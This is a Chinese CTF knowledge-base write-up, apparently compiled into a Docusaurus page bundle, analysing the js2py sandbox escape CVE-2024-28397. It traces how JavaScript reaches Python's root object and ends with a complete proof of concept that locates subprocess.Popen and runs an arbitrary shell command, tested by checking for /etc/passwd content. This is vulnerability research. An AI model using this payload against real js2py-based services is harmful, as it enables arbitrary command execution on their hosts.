"use strict";(globalThis.webpackChunkblog=globalThis.webpackChunkblog||[]).push([[247],{2619:(e,s,n)=>{n.r(s),n.d(s,{assets:()=>r,contentTitle:()=>i,default:()=>p,frontMatter:()=>d,metadata:()=>t,toc:()=>l});const t=JSON.parse('{"id":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/CTF/\u5947\u6280\u6deb\u5de7/JS2PY\u610f\u5916\u83b7\u53d6\u6839\u5bf9\u8c61CVE-2024-28397","title":"JS2PY\u610f\u5916\u83b7\u53d6\u6839\u5bf9\u8c61CVE-2024-28397","description":"|\u4f5c\u8005|\u4fee\u8ba2\u65f6\u95f4|","source":"@site/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/07.CTF/02.\u5947\u6280\u6deb\u5de7/04.JS2PY\u610f\u5916\u83b7\u53d6\u6839\u5bf9\u8c61CVE-2024-28397.md","sourceDirName":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/07.CTF/02.\u5947\u6280\u6deb\u5de7","slug":"/\u4e2a\u4eba\u77e5\u8bc6\u5e93/CTF/\u5947\u6280\u6deb\u5de7/JS2PY\u610f\u5916\u83b7\u53d6\u6839\u5bf9\u8c61CVE-2024-28397","permalink":"/en/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/CTF/\u5947\u6280\u6deb\u5de7/JS2PY\u610f\u5916\u83b7\u53d6\u6839\u5bf9\u8c61CVE-2024-28397","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/07.CTF/02.\u5947\u6280\u6deb\u5de7/04.JS2PY\u610f\u5916\u83b7\u53d6\u6839\u5bf9\u8c61CVE-2024-28397.md","tags":[],"version":"current","sidebarPosition":4,"frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"FILTERS\u7684\u4efb\u610f\u683c\u5f0f\u8f93\u51fa","permalink":"/en/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/CTF/\u5947\u6280\u6deb\u5de7/FILTERS\u7684\u4efb\u610f\u683c\u5f0f\u8f93\u51fa"},"next":{"title":"Handlebars-AST\u6ce8\u5165","permalink":"/en/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/CTF/\u5947\u6280\u6deb\u5de7/Handlebars-AST\u6ce8\u5165"}}');var c=n(4848),a=n(8453);const d={},i="JS2PY\u610f\u5916\u83b7\u53d6\u6839\u5bf9\u8c61CVE-2024-28397",r={},l=[{value:"0x01 \u73af\u5883",id:"0x01-\u73af\u5883",level:2},{value:"0x02 \u524d\u6cbf",id:"0x02-\u524d\u6cbf",level:2},{value:"0x03 \u5206\u6790",id:"0x03-\u5206\u6790",level:2},{value:"0x04 POC",id:"0x04-poc",level:2}];function o(e){const s={a:"a",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",li:"li",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,a.R)(),...e.components};return(0,c.jsxs)(c.Fragment,{children:[(0,c.jsxs)(s.table,{children:[(0,c.jsx)(s.thead,{children:(0,c.jsxs)(s.tr,{children:[(0,c.jsx)(s.th,{style:{textAlign:"left"},children:"\u4f5c\u8005"}),(0,c.jsx)(s.th,{style:{textAlign:"left"},children:"\u4fee\u8ba2\u65f6\u95f4"})]})}),(0,c.jsx)(s.tbody,{children:(0,c.jsxs)(s.tr,{children:[(0,c.jsx)(s.td,{style:{textAlign:"left"},children:(0,c.jsx)(s.img,{src:"https://img.shields.io/badge/wjlin0-%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93-green",alt:"wjlin0"})}),(0,c.jsx)(s.td,{style:{textAlign:"left"},children:"2024-06-23 01:02:22"})]})})]}),"\n",(0,c.jsx)(s.header,{children:(0,c.jsx)(s.h1,{id:"js2py\u610f\u5916\u83b7\u53d6\u6839\u5bf9\u8c61cve-2024-28397",children:"JS2PY\u610f\u5916\u83b7\u53d6\u6839\u5bf9\u8c61CVE-2024-28397"})}),"\n",(0,c.jsx)(s.h2,{id:"0x01-\u73af\u5883",children:"0x01 \u73af\u5883"}),"\n",(0,c.jsx)(s.pre,{children:(0,c.jsx)(s.code,{className:"language-sh",children:"pip install js2py <= 0.74 #latest\n"})}),"\n",(0,c.jsx)(s.h2,{id:"0x02-\u524d\u6cbf",children:"0x02 \u524d\u6cbf"}),"\n",(0,c.jsxs)(s.p,{children:["\u65e0\u610f\u5728git\u4e0a\u770b\u5230\u4e00\u4e2a\u5173\u4e8e ",(0,c.jsx)(s.a,{href:"https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape",children:"CVE-2024-28397"})," \u7684POC\uff0cjs2py\u5b58\u5728\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u6f0f\u6d1e\u5728js\u4ee3\u7801\u4e2d\u83b7\u5f97\u4e00\u4e2apython\u5bf9\u8c61\u7684\u5f15\u7528\uff0c\u4f7f\u5f97\u653b\u51fb\u8005\u53ef\u4ee5\u9003\u9038js\u73af\u5883\uff0c\u5728\u4e3b\u673a\u4e0a\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002\u7528\u6237\u4e00\u822c\u4f1a\u8c03\u7528",(0,c.jsx)(s.code,{children:"js2py.disable_pyimport()"}),"\u963b\u6b62JS\u4ee3\u7801\u4f7f\u7528",(0,c.jsx)(s.code,{children:"pyimport"}),"\u8c03\u7528python\u6a21\u5757\uff0c\u4ece\u800c\u9632\u6b62\u4ee3\u7801\u6c99\u76d2\u9003\u9038\u3002\u4f46\u662f\u4f7f\u7528\u8fd9\u4e2a\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u7ed5\u8fc7\u8fd9\u4e2a\u9650\u5236\uff0c\u5728\u4e3b\u673a\u4e0a\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002"]}),"\n",(0,c.jsx)(s.h2,{id:"0x03-\u5206\u6790",children:"0x03 \u5206\u6790"}),"\n",(0,c.jsxs)(s.p,{children:["\u6839\u636e\u63d0\u4f9b\u7684\u4ee3\u7801\uff0c\u53d1\u73b0",(0,c.jsx)(s.code,{children:"Object.getOwnPropertyNames({}).__class__.__base__"}),"\uff0c\u5373\u53ef\u83b7\u53d6\u5230\u4e00\u4e2a",(0,c.jsx)(s.strong,{children:"\u6839\u5bf9\u8c61"}),"\uff0c\u90a3\u4e48\u8fd9\u662f\u5982\u4f55\u5f97\u5230\u7684\u5462"]}),"\n",(0,c.jsx)(s.p,{children:"\u6211\u4eec\u53ef\u4ee5\u5199\u4e00\u4e2a\u4ee3\u7801\u8fdb\u884c\u8c03\u8bd5"}),"\n",(0,c.jsx)(s.pre,{children:(0,c.jsx)(s.code,{className:"language-py",children:'import js2py\npayload_2 = """console.log(Object.getOwnPropertyNames({}).__class__.__base__)"""\njs2py.eval_js(payload_2)\n'})}),"\n",(0,c.jsxs)(s.p,{children:["\u6574\u6bb5\u4ee3\u7801\u4f1a\u88ab",(0,c.jsx)(s.code,{children:"self.code(*args)"}),"\u53bb\u6267\u884c\u8c03\u7528\uff0c\u4ed6\u7684\u89e3\u6790\u987a\u5e8f\u662f\u4ece\u5de6\u5f80\u53f3",(0,c.jsx)(s.code,{children:"console\u3001.log()\u3001Object ......"})]}),"\n",(0,c.jsx)(s.p,{children:(0,c.jsx)(s.img,{alt:"f7c83fc40db51c0676aa220a6b4263fd",src:n(8767).A+"",width:"2862",height:"1698"})}),"\n",(0,c.jsxs)(s.p,{children:["\u5e76\u4e14\u4f9d\u6b21\u8c03\u7528",(0,c.jsx)(s.code,{children:"PyJs.get(self, prop)"}),"\uff0c\u83b7\u53d6\u5bf9\u5e94\u7684\u5bf9\u8c61\u3002"]}),"\n",(0,c.jsx)(s.p,{children:(0,c.jsx)(s.img,{alt:"650f67657bc934405a122dcf131189ee",src:n(5927).A+"",width:"1466",height:"560"})}),"\n",(0,c.jsxs)(s.p,{children:["\u90a3\u4e48\u8fd9\u4e2a",(0,c.jsx)(s.code,{children:"Object.getOwnPropertyNames({})"}),"\u662f\u4e2a\u5565\u5462\uff0c\u6211\u4eec\u8ddf\u8fdb\u53d1\u73b0\uff0c\u5b83\u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u65b9\u6cd5\u7528\u4e8e\u83b7\u53d6\uff0c\u7684\u6240\u6709 ",(0,c.jsx)(s.code,{children:"keys()"}),"\uff0c\u90a3\u4e48\u5927\u6982\u7387\uff0c\u8fd9\u91cc\u8fd4\u56de\u7684\u5bf9\u8c61\u5c31\u4e3a",(0,c.jsx)(s.code,{children:"dict"}),"\u5bf9\u8c61"]}),"\n",(0,c.jsx)(s.p,{children:(0,c.jsx)(s.img,{alt:"a712fa934ad208f15e46e3adf758eaa3",src:n(6412).A+"",width:"1778",height:"594"})}),"\n",(0,c.jsxs)(s.p,{children:["\u6b64\u65f6",(0,c.jsx)(s.code,{children:"own.keys()"})," \u8fd4\u56de\u7684\u5bf9\u8c61 \u4e3a ",(0,c.jsx)(s.code,{children:"dict"})]}),"\n",(0,c.jsx)(s.p,{children:(0,c.jsx)(s.img,{alt:"cdf2c66969b232f56aa024ff6d2415ea",src:n(7753).A+"",width:"1994",height:"1256"})}),"\n",(0,c.jsxs)(s.p,{children:["\u5f97\u5230\u7684\u5bf9\u8c61\u7684\u786e\u4e3a",(0,c.jsx)(s.code,{children:"dict"})]}),"\n",(0,c.jsx)(s.p,{children:(0,c.jsx)(s.img,{alt:"71d59a397371a8a061736a8aa625eea1",src:n(6145).A+"",width:"2324",height:"1320"})}),"\n",(0,c.jsxs)(s.p,{children:["\u4ee3\u7801\u8fd0\u884c\u5230\u8fd9\u91cc\u4e4b\u540e\uff0c\u5c31\u7b80\u5355\u591a\u4e86\uff0c\u5728",(0,c.jsx)(s.code,{children:"python"}),"\u91cc\uff0c\u83b7\u53d6\u6839\u5bf9\u8c61\u7684\u65b9\u5f0f\uff0c\u53ef\u4ee5\u6839\u636e\u57fa\u672c\u5bf9\u8c61\u6765\u83b7\u53d6\u6839\u5bf9\u8c61\uff0c\u4f8b\u5982\u4ee5\u4e0b"]}),"\n",(0,c.jsx)(s.pre,{children:(0,c.jsx)(s.code,{className:"language-py",children:'print({}.__class__.__base__)\nprint("".__class__.__base__)\nprint(().__class__.__base__)\n'})}),"\n",(0,c.jsx)(s.p,{children:(0,c.jsx)(s.img,{alt:"8d21ef7a38064f02f76316ab1c70c1b0",src:n(6335).A+"",width:"2264",height:"1304"})}),"\n",(0,c.jsx)(s.p,{children:"\u5f97\u5230\u6839\u5bf9\u8c61\u540e\uff0c\u540e\u9762\u4e0essti\u6a21\u7248\u6ce8\u5165\u7c7b\u4f3c\uff0c"}),"\n",(0,c.jsx)(s.pre,{children:(0,c.jsx)(s.code,{children:'import js2py\n\npayload_2 = """\nlet o = Object.getOwnPropertyNames({}).__class__.__base__.__subclasses__()\nfor (i in o) {\n   console.log(o[i])\n}\n"""\njs2py.eval_js(payload_2)\n'})}),"\n",(0,c.jsx)(s.p,{children:"\u4e0b\u9762\u67096\u79cd\u65b9\u5f0f\u53ef\u4ee5\u6267\u884c\u547d\u4ee4"}),"\n",(0,c.jsx)(s.pre,{children:(0,c.jsx)(s.code,{className:"language-sh",children:"\u5185\u5efa\u51fd\u6570 eval \u6267\u884c\u547d\u4ee4\nos \u6a21\u5757\u6267\u884c\u547d\u4ee4\npopen \u51fd\u6570\u6267\u884c\u547d\u4ee4\nimportlib \u7c7b\u6267\u884c\u547d\u4ee4\nlinecache \u51fd\u6570\u6267\u884c\u547d\u4ee4\nsubprocess.Popen \u7c7b\u6267\u884c\u547d\u4ee4\n"})}),"\n",(0,c.jsxs)(s.p,{children:["\u7531\u4e8e \u83b7\u53d6\u7684\u5bf9\u8c61\u5747\u662f \u662f\u88ab\u5c01\u88c5\u540e\u7684\uff0c\u4f8b\u5982\u6839\u5bf9\u8c61 \u90fd\u662f ",(0,c.jsx)(s.code,{children:"PyObjectWarpper"})]}),"\n",(0,c.jsx)(s.p,{children:(0,c.jsx)(s.img,{alt:"f370f31459c94cebb2900f580b26faee",src:n(3034).A+"",width:"1336",height:"426"})}),"\n",(0,c.jsxs)(s.p,{children:["\u5e76\u4e14\u83b7\u53d6\u5230\u7684",(0,c.jsx)(s.code,{children:"__init__"})," \u51fd\u6570\u5bf9\u8c61\u4e5f\u5747\u88ab\u5c01\u88c5"]}),"\n",(0,c.jsx)(s.p,{children:(0,c.jsx)(s.img,{alt:"eca2ceab4a2e8483ad4416c424a9111d",src:n(7954).A+"",width:"1730",height:"648"})}),"\n",(0,c.jsxs)(s.p,{children:["\u65e0\u6cd5\u83b7\u53d6",(0,c.jsx)(s.code,{children:"__globals__"}),"\uff0c\u4e5f\u5c31\u65e0\u6cd5\u4ece\u8fd9\u91cc\u5165\u624b\u83b7\u53d6\u5185\u5efa\u53d8\u91cf",(0,c.jsx)(s.code,{children:"__builtins__"})]}),"\n",(0,c.jsx)(s.p,{children:(0,c.jsx)(s.img,{alt:"0afd799d813b550caf14fb94e0972937",src:n(7006).A+"",width:"2358",height:"1428"})}),"\n",(0,c.jsx)(s.p,{children:"\u6240\u4ee5\u8fd9\u91cc\u4e00\u5171\u6709\u4e24\u79cd\u65b9\u5f0f"}),"\n",(0,c.jsxs)(s.ul,{children:["\n",(0,c.jsxs)(s.li,{children:["\u5229\u7528",(0,c.jsx)(s.code,{children:"importlib"})," \u65b9\u6cd5\u5bfc\u5165\u7c7b"]}),"\n"]}),"\n",(0,c.jsxs)(s.p,{children:["\u5728python \u4e2d\u5b58\u5728\u4e00\u4e2a\u7c7b ",(0,c.jsx)(s.code,{children:"_frozen_importlib.BuiltinImporter"})," \u8fd9\u4e2a\u7c7b\uff0c\u5728python \u4e2d\u7684\u4f5c\u7528\u5c31\u662f \u63d0\u4f9b Python \u4e2d import \u8bed\u53e5\u7684\u5b9e\u73b0\uff08\u4ee5\u53ca ",(0,c.jsx)(s.code,{children:"__import__"})," \u51fd\u6570\uff09\u3002\u6211\u4e48\u53ef\u4ee5\u76f4\u63a5\u5229\u7528\u8be5\u7c7b\u4e2d\u7684load_module\u5c06os\u6a21\u5757\u5bfc\u5165\uff0c\u4ece\u800c\u4f7f\u7528 os \u6a21\u5757\u6267\u884c\u547d\u4ee4\u3002"]}),"\n",(0,c.jsx)(s.p,{children:(0,c.jsx)(s.img,{alt:"5007a129124cb7e3a84f851529884436",src:n(5729).A+"",width:"1876",height:"1476"})}),"\n",(0,c.jsxs)(s.ul,{children:["\n",(0,c.jsxs)(s.li,{children:["\u5229\u7528",(0,c.jsx)(s.code,{children:"subprocess.Popen"})," \u7c7b\u6267\u884c\u547d\u4ee4"]}),"\n"]}),"\n",(0,c.jsx)(s.p,{children:"\u8fd9\u91cc\u7c7b\u662f\u5728python 2.4\u5f15\u5165\u7684 \u53ef\u4ee5\u7528subprocess\u8fd9\u4e2a\u6a21\u5757\u6765\u4ea7\u751f\u5b50\u8fdb\u7a0b\uff0c\u5e76\u8fde\u63a5\u5230\u5b50\u8fdb\u7a0b\u7684\u6807\u51c6\u8f93\u5165/\u8f93\u51fa/\u9519\u8bef\u4e2d\u53bb\uff0c\u8fd8\u53ef\u4ee5\u5f97\u5230\u5b50\u8fdb\u7a0b\u7684\u8fd4\u56de\u503c\u3002subprocess\u610f\u5728\u66ff\u4ee3\u5176\u4ed6\u51e0\u4e2a\u8001\u7684\u6a21\u5757\u6216\u8005\u51fd\u6570\uff0c\u6bd4\u5982\uff1aos.system,os.popen\u7b49\u51fd\u6570\u3002"}),"\n",(0,c.jsx)(s.p,{children:(0,c.jsx)(s.img,{alt:"2822d519284e2178b008fb245a207db1",src:n(4383).A+"",width:"1796",height:"1504"})}),"\n",(0,c.jsx)(s.h2,{id:"0x04-poc",children:"0x04 POC"}),"\n",(0,c.jsx)(s.pre,{children:(0,c.jsx)(s.code,{className:"language-py",children:'import js2py\nfrom sys import version\n\npayload = """\n// [+] command goes here:\nlet cmd = "open -a Calculator"\nlet hacked, bymarve, n11\nlet getattr, obj\n\nhacked = Object.getOwnPropertyNames({})\nbymarve = hacked.__getattribute__\nn11 = bymarve("__getattribute__")\nobj = n11("__class__").__base__\ngetattr = obj.__getattribute__\n\nfunction findpopen(o) {\n    let result;\n    for(let i in o.__subclasses__()) {\n        let item = o.__subclasses__()[i]\n        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {\n            return item\n        }\n        if(item.__name__ != "type" && (result = findpopen(item))) {\n            return result\n        }\n    }\n}\n\nn11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()\nconsole.log(n11)\nn11\n"""\n\ndef test_poc():\n    etcpassword_piece = "root:x:0:0"\n    result = ""\n    try:\n        result = repr(js2py.eval_js(payload))\n    except Exception:\n        return False\n    return etcpassword_piece in result\n\ndef main():\n    test_poc()\n\nif __name__ == "__main__":\n    main()\n'})})]})}function p(e={}){const{wrapper:s}={...(0,a.R)(),...e.components};return s?(0,c.jsx)(s,{...e,children:(0,c.jsx)(o,{...e})}):o(e)}},3034:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/f370f31459c94cebb2900f580b26faee-b5a84aa0aebd62aee22c32b21400f046.png"},4383:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/2822d519284e2178b008fb245a207db1-fb6e3baf1918f94ba359f7248e1144be.png"},5729:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/5007a129124cb7e3a84f851529884436-1d0d8228ba2bf52d840dc02b54aea2d6.png"},5927:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/650f67657bc934405a122dcf131189ee-b50041e2c384fa341c08efad9b404e91.png"},6145:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/71d59a397371a8a061736a8aa625eea1-7a900fb2867708f8078ee1f5532433d1.png"},6335:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/8d21ef7a38064f02f76316ab1c70c1b0-d83a1cf1196f176519ebce1b51765c44.png"},6412:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/a712fa934ad208f15e46e3adf758eaa3-e15ed49fff3e768596c6aab320a0e8b6.png"},7006:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/0afd799d813b550caf14fb94e0972937-d47cea09dd075e314d10a5b4406ed39e.png"},7753:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/cdf2c66969b232f56aa024ff6d2415ea-0ce1e926d8aa8c1d3351d64463f9a9b5.png"},7954:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/eca2ceab4a2e8483ad4416c424a9111d-59de62547ef850bb9db0075867f2dc8f.png"},8453:(e,s,n)=>{n.d(s,{R:()=>d,x:()=>i});var t=n(6540);const c={},a=t.createContext(c);function d(e){const s=t.useContext(a);return t.useMemo(function(){return"function"==typeof e?e(s):{...s,...e}},[s,e])}function i(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(c):e.components||c:d(e.components),t.createElement(a.Provider,{value:s},e.children)}},8767:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/f7c83fc40db51c0676aa220a6b4263fd-c557133287a733812ea44bda107ff68f.png"}}]);